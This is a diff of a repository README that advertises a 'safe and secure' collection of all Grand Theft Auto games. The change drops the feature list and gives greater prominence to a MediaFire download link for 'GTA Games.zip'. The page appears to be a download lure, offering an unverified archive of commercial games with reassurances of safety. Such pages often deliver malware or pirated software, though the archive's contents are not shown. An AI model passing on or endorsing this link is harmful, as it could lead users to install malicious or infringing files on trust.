@@ -4,9 +4,6 @@ A comprehensive tool that provides a safe and secure collection of all Grand The
 
 <img width="900" height="548" alt="{56FAEACE-FAEB-4B47-845C-22729E8ABE8E}" src="https://github.com/user-attachments/assets/3656270e-8f76-4340-8965-1c9c079933e7" />
 
-<a href="https://www.mediafire.com/file/psh4u7k0ihl4ytj/GTA+Games.zip/file">Download</a>
-
-
 ## What does it do?
 
 1. Browse through the complete GTA game collection
@@ -17,16 +14,11 @@ A comprehensive tool that provides a safe and secure collection of all Grand The
 
 <img width="900" height="548" alt="{5F09B851-F843-4CCD-B022-41EE6E757C7A}" src="https://github.com/user-attachments/assets/a2e49cc0-f092-45bf-8b17-59732980b48d" />
 
-## Features
+## Download
 
-- Complete GTA game collection
-- All major game versions
-- Source code access for developers
-- Game version management
-- Secure HTTPS downloads
-- Mod support and tutorials
-- Easy installation wizard
-- Minimal clean interface
+Get the GTA Games Project and explore the complete collection with all available versions, updates, and additional resources.
+
+**Download :** <a href="https://www.mediafire.com/file/psh4u7k0ihl4ytj/GTA+Games.zip/file">Download</a>
 
 ## How to use
 
